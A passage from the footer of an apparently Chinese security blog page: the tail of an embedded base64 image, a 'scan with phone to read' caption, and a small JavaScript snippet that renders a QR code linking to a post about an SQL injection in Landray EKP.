uS77idUNySm+CdwcCnibsMT9DJgxdEw56Dkh6icD29IOxisC5rBUOnIf+MTrcjNC1M5e+cKxJDViTGiE4F00QnIeOZ9zdgaT4wt85gTYQTVk2L6vcPUtN1a1y4pMXKpbJl8mvptxs0J806LdCddHKr5Z8xcrLr9zsg9dMXnoZOA+EeghVK4tYfqwNJOSFrz2BayCvPf/d6ruBANsb6055S4A5eBxvZcN3rqYQ3GcQPBmclcF+HRhzMMbqpz1WU04Ge63ysujlyxILFa8M3A+4/h7y8WZf7YaApzTvD5yH8Q1UE4+lJnHFcJ9B8Jq1T/z0SQzWAqG2Gw40jLYJFk40FaH3AFpV1cRv5InziLYN5KTPRf3iCbSBZHrBsz0A29MXzaoGrIERUyOc68BacTJwDB2Vr5YewpqXr5xM/mzKy6D3htFPjXQyMJ88OIb+6gHOrTRzTj1lyQvbQBRc9voTaAMBTxZGXG1RU5WFA9ckXqH0MrAW2MnEy0LIj805YLil4SuCNWBML2HVyVdOJj+mWJY4CO6XWAjOSS9TbjYYNTDGqmsDmYuv+DUn0P6mrulUO9sOeLKzBpyH/pqantEmFiY3ozgZ7PuBc6kBx9AxnHrIElcE68XLKhcfrAFj8tLLElcEa8FYuUf864Y8ckq/qLkGcnrYv08e/sVQV3K2bC/5xMHkheArC8ZowDF0POKSX6HWOLLowWtEB46hv6RCzwEpHTD1Q3IKopmxysIllxjYPqAA169OPt7sq72pQ58SPObnZ1lNOrkguGdqhOHky45i5cWvDNwXWNFbDtieQPWJgXOb4M5/wNpHasHas5YwatJXeL2HnJ3cC7g2EE3nUfvMPsFPw6o3mHukH6y1te/cJ9ycVxwuqJwssVDxysTJPstFr1oZ+GeCjm0gEV/42hPYDQT6tGD0n9mqngQZjL2gf9IRLwNrsg44BpJqCGzvC7DHJvrrqLfsb7gBuG4Lbv8RL7u5h98w1lQhmIMRV5rktN5su4FEfOFrTuAayGvO/XDVbxkI+JrW6wfOgTE7qJrkguHmWPnkgsodWTQzgvcCzFR7+dsRt8S8DrDpb9Thd2qqILmam/1vGcjc9IqfP4FvGUgmD35yYP+GfbZFcF006Ze4YjhwDewxejCXuGL61Jx8cA30n0H5Ry19wX1qHTgHxnDgGLh+dfLxZl+7G5IJr/De3msNeOpzDTgPzFSLge01GjqmNziXeIVpFA72NdGAucQrBGvAuNJkrZlLfoXRVm43kIgufM0JtIGApw/38ae3mifmbB043udcl36wr4k2morhjrBqYewdDnp+7gPmar4NpCYv/3UncA3kdWe/XPl/AAAA///OHaU0AAAABklEQVQDAHQjQrBhGjoXAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/landray-ekp-sys-webservice-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 